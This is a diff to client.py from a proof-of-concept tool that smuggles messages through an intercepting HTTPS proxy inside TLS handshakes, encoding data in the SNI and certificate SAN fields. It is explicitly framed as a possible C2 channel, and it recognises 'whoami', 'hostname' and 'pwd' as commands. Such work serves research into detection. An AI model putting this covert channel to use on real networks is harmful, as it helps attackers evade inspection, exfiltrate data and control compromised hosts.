@@ -5,12 +5,12 @@ client.py
 
 PoC To Smuggle Messages through an intercepting HTTPS proxy using only the TLS Handshake.
 
-Client Max Bytes Per TLS Client Hello: 284
-Server Max Bytes Per TLS Server Hello: 16k - TLS overhead [~15k]
+Client Max Bytes Per TLS Client Hello: 284 / 2 ( /2 because of encoding)
+Server Max Bytes Per TLS Server Hello: 16k - TLS overhead [~15k] / 2 ( /2 because of encoding)
 
 TODO:
     1. Implement Reliable Packetization Protocol
-    2. Implment server.py (using x509 SNA fields for smuggling)
+    DONE  - 2. Implment server.py (using x509 SAN fields for smuggling)
     3. Test and investigate how detectable this is as a C2 channel
  
 """
@@ -85,6 +85,11 @@ class TLSClientHandshake:
         Takes a string message and returns a Tuple of bytes cooresponding to SNI and random field in the TLS record
         """
         hex_msg = self._str_to_hex(message)
+        # TODO: This breaks if host/labels are longer than 63 chars!
+        # TODO: FIX THIS!
+        # need to ensure that each 'label' contains max 63 chars
+        # sliced = [hex_msg[x : x + 63] for x in range(0, len(hex_msg), 63)]
+        # hex_msg = ".".join(sliced)
         sni_tld = self._get_random_tld()
         # TODO: make this more robust - Use random seed field for smuggling
         return (self.make_sni(hex_msg + sni_tld), self._get_random_seed())
@@ -147,6 +152,9 @@ class TLSClientHandshake:
         list_len = struct.pack(">H", len(name) + 3)
         ext_len = struct.pack(">H", len(name) + 5)
         return b"\x00\x00" + ext_len + list_len + b"\x00" + hostname_len + name
+
+
+# end class TLSClientHandshake()
 
 
 def connect_proxy(proxy_host: str, proxy_port: int, server: str) -> socket.socket:
@@ -222,35 +230,48 @@ def parse_server_hello(response_bytes: bytes) -> str:
 def _validate_handshake_msg(hex_str: str, hex_array: list) -> int:
     is_valid_handshake = True
     position = 0
-    try:
-        current_obj_len = 0
-        handshake_len = 0
-        if hex_str[0:2] != "16":
-            is_valid_handshake = False
-        if hex_str[2:4] != "03":
-            is_valid_handshake = False
-        if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
-            is_valid_handshake = False
-        max_len = int(math.pow(2, 15))
-        handshake_len = int(hex_str[6:10], 16)
-        if (handshake_len < 1) or (handshake_len > max_len):
-            is_valid_handshake = False
-        if hex_str[10:12] != "02":
-            is_valid_handshake = False
+    # For each TLS record
+    # print(hex_str)
+    # try:
+    current_obj_len = 0
+    handshake_len = 0
+    if hex_str[0:2] != "16":
+        is_valid_handshake = False
+    if hex_str[2:4] != "03":
+        is_valid_handshake = False
+    if (int(hex_str[4:6], 16) < 1) or (int(hex_str[4:6], 16) > 4):
+        is_valid_handshake = False
+    max_len = int(math.pow(2, 15))
+    handshake_len = int(hex_str[6:10], 16)
+    if (handshake_len < 1) or (handshake_len > max_len):
+        is_valid_handshake = False
+    if hex_str[10:12] != "0b":
+        # If not a Certificate type message
+        is_valid_handshake = False
         current_obj_len = int(hex_str[12:18], 16)
         if (current_obj_len < 1) or (current_obj_len > max_len):
             is_valid_handshake = False
+        # assume nested record
         position = 1 + 2 + 2 + current_obj_len + 3 + 1
         if hex_array[position] != "0b":
-            is_valid_handshake = False
+            # it's possible this is an un-nested tls recoard layer
+            if "".join(hex_array[position : position + 3]) == "160303":
+                return _validate_handshake_msg("".join(hex_array[position:]), hex_array[position:])
+        else:
+            position = position + 1
+            current_obj_len = int("".join(hex_array[position : position + 3]), 16)
+            position = position + 3
+            certs_len = int("".join(hex_array[position : position + 3]), 16)
+    else:
+        current_obj_len = int(hex_str[12:18], 16)
         position = position + 1
         current_obj_len = int("".join(hex_array[position : position + 3]), 16)
         position = position + 3
         certs_len = int("".join(hex_array[position : position + 3]), 16)
-        if certs_len < 32:
-            is_valid_handshake = False
-    except:
+    if certs_len < 32:
         is_valid_handshake = False
+    # except:
+    # is_valid_handshake = False
     if not is_valid_handshake:
         return -1
     return position
@@ -304,7 +325,7 @@ def _find_san_records(cert_list: list) -> list:
 
 
 def check_for_command(msg: str) -> bool:
-    if msg in ["whoami", "hostname"]:
+    if msg in ["whoami", "hostname", "pwd"]:
         return True
 
 
@@ -375,7 +396,6 @@ if __name__ == "__main__":
         if (proxy_scheme != "http") or (len(proxy_hostname) < 3) or (not proxy_port) or (not is_good_proxy_url):
             arg_parse.error("Error: The Supplied proxy URL appears invalid. Example: http://proxy.company.com:8080/")
             exit(1)
-    # Proxy CONNECT PHASE
     proxy_socket = None
     connect_args = None
     prox_end_time_ns = None
@@ -405,6 +425,8 @@ if __name__ == "__main__":
         reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_1").to_byte_stream())
         reqs_list_str.append("DEMO_CMD_2")
         reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_2").to_byte_stream())
+        # reqs_list_str.append("DEMO_CMD_3")
+        # reqs_list_byte_stream.append(TLSClientHandshake("DEMO_CMD_3").to_byte_stream())
     response_parsed_list = []
     response_bytes_list = []
     tls_start_time_ns = int(time.time_ns())
